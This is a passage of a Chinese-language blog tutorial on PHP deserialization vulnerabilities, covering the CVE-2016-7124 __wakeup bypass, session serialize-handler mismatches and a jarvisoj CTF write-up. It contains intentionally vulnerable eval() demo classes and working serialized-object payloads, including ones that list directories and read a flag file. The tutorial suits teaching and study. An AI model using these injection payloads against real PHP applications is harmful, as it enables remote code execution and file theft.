+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span></code></pre></div><p>只要后面接受的<code>str</code>参数反序列化得到<code>D0g3!!!</code>就可以了得到flag了</p>
+<p><a href="http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22">http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</a></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/8.png" alt=""></p>
+<h2 id="反序列化对象注入-cve-2016-7124">反序列化对象注入-CVE-2016-7124</h2>
+<p><a href="https://bugs.php.net/bug.php?id=72663">CVE-2016-7124</a>，简单来说就是<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</strong></p>
+<p>我们用一个例子来理解这个漏洞原理：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl">   <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="s1">&#39;flag&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s1">&#39;success&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="s1">&#39;you failed 23333&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;answer&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$answer</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;answer&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$answer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$answer</span><span class="p">);</span><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>构造正常反序列化对象：<code>O:4:&quot;Test&quot;:2:{s:3:&quot;key&quot;;s:4:&quot;flag&quot;;}</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/9.png" alt=""></p>
+<p>发现<code>__wakeup()</code>会先执行，<code>__destruct()</code>中的判断不成立，无法输出success，尝试将对象属性个数1改为任意大于1的数，即可绕过<code>__wakeup()</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/10.png" alt=""></p>
+<h1 id="0x04-session反序列化漏洞">0x04 session反序列化漏洞</h1>
+<h2 id="简介">简介</h2>
+<p>首先我们需要了解session反序列化是什么？
+PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化
+在php.ini中有以下配置项，mamp的默认配置如图</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/11.png" alt=""></p>
+<p><code>session.save_path</code> 设置session的存储路径
+<code>session.save_handler</code> 设定用户自定义存储函数
+<code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话
+<code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php
+除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">处理器</th>
+<th style="text-align:left">对应的存储格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">php</td>
+<td style="text-align:left">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td style="text-align:left">php_binary</td>
+<td style="text-align:left">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td style="text-align:left">php_serialize  (php&gt;=5.5.4)</td>
+<td style="text-align:left">经过 serialize() 函数反序列处理的数组</td>
+</tr>
+</tbody>
+</table>
+<h2 id="存储机制">存储机制</h2>
+<p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。
+来测试一个demo</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;test&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>运行后在配置文件设定的路径中会生成一个session文件</p>
+<p>我的文件是保存在<code>/Applications/MAMP/tmp/php</code>目录下</p>
+<ul>
+<li>当<code>session.serialize_handler</code>为<code>php</code>时</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name|s:4:&#34;test&#34;;
+</span></span></code></pre></div><ul>
+<li>当<code>session.serialize_handler</code>为<code>php_serialize</code>时</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a:1:{s:4:&#34;name&#34;;s:4:&#34;test&#34;;}
+</span></span></code></pre></div><ul>
+<li>当<code>session.serialize_handler</code>为<code>php_binary</code>时</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;0x04&gt;names:4:&#34;test&#34;;
+</span></span></code></pre></div><p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p>
+<h2 id="php-session中的序列化危害">PHP Session中的序列化危害</h2>
+<p>HP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。
+如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;ryat&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;|O:11:&#34;PeopleClass&#34;:0:{}&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><p>上述的$_SESSION的数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;}</code>。
+但是我们在进行读取的时候，选择的是<code>php</code>，那么最后读取的内容是:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">array</span> <span class="p">(</span><span class="nx">size</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;a:1:{s:6:&#34;spoock&#34;;s:24:&#34;&#39;</span> <span class="o">=&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">object</span><span class="p">(</span><span class="nx">__PHP_Incomplete_Class</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="k">public</span> <span class="s1">&#39;__PHP_Incomplete_Class_Name&#39;</span> <span class="o">=&gt;</span> <span class="nx">string</span> <span class="s1">&#39;PeopleClass&#39;</span> <span class="p">(</span><span class="nx">length</span><span class="o">=</span><span class="mi">11</span><span class="p">)</span>
+</span></span></code></pre></div><p>这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:{}</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。
+这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+<p>举个例子来理解：</p>
+<p>存在us1.php和us2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、
+us1.php，使用php_serialize来处理session</p>
+<p>新建文件us1.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;spoock&#34;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>新建文件us2.php,使用php来处理session</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">lemon</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$hi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hi</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>访问<code>http://127.0.0.1/us1.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;}</code></p>
+<p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化。
+此时访问us2.php时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问us2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/12.png" alt=""></p>
+<p>如果还是不理解，可以用PHPstorm工具来进行动态debug代码，可以参考我之前的文章[https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/](<a href="https://getpass.cn/2018/04/10/Breakpoint">https://getpass.cn/2018/04/10/Breakpoint</a> debugging with phpstorm+xdebug/)</p>
+<p>执行的时候，session反序列化会执行里面销毁前的魔术函数<code>__destruct()</code>，前面的<code>__construct()</code>就不再执行了。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/13.png" alt=""></p>
+<h2 id="jarvisoj-web的一道session反序列化">jarvisoj-web的一道SESSION反序列化</h2>
+<p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a>)
+Index页给源码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//A webshell is wait for you
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">OowoO</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$mdzz</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_string</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
+<p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/14.png" alt=""></p>
+<p>session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
+<p>官方文档的解释：<a href="http://php.net/manual/en/session.upload-progress.php">http://php.net/manual/en/session.upload-progress.php</a></p>
+<p>构造上传的表单:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;http://web.jarvisoj.com:32784/index.php&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span> <span class="nx">enctype</span><span class="o">=</span><span class="s2">&#34;multipart/form-data&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;123&#34;</span> <span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>用burp抓包，修改filename参数为：</p>
+<p><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; </code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/15.png" alt=""></p>
+<p>读取文件内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">|</span><span class="nx">O</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="nx">\</span><span class="s2">&#34;OowoO</span><span class="se">\&#34;</span><span class="s2">:1:{s:4:</span><span class="se">\&#34;</span><span class="s2">mdzz</span><span class="se">\&#34;</span><span class="s2">;s:88:</span><span class="se">\&#34;</span><span class="s2">print_r(file_get_contents(</span><span class="se">\&#34;</span><span class="s2">/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php</span><span class="se">\&#34;</span><span class="s2">));</span><span class="se">\&#34;</span><span class="s2">;}
+</span></span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/16.png" alt=""></p>
+<h1 id="0x05-参考">0x05 参考</h1>
+<p><a href="https://xz.aliyun.com/t/3674">https://xz.aliyun.com/t/3674</a></p>
+<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<p><a href="https://www.anquanke.com/post/id/159206">https://www.anquanke.com/post/id/159206</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/analysis-of-php-deserialization-vulnerabilities.html">https://xxe.icu/analysis-of-php-deserialization-vulnerabilities.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        <div class="text-base md:text-sm text-gray-500 pt-6">
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E6%BC%8F%E6%B4%9E.html">
+                    #漏洞
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html">
+                    #代码审计
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/php.html">
+                    #php
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">
+                    #PHP反序列化
+                </a>
+                                    
+            </div>
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell.html" class="underline text-yellow-600">zzzphp1.61 代码审计-从SQL注入到Getshell</a></li>
+    
+    <li><a href="/seacms8.7-sql-injection-analysis.html" class="underline text-yellow-600">Seacms 8.7版本SQL注入分析</a></li>
+    
+    <li><a href="/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability.html" class="underline text-yellow-600">CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</a></li>
+    
+    <li><a href="/phpok4.9-background-getshell.html" class="underline text-yellow-600">phpok4.9后台getshell(每周一洞)</a></li>
+    
+    <li><a href="/phpok-4.9-code-audit.html" class="underline text-yellow-600">phpok 4.9代码审计(每周一洞)</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
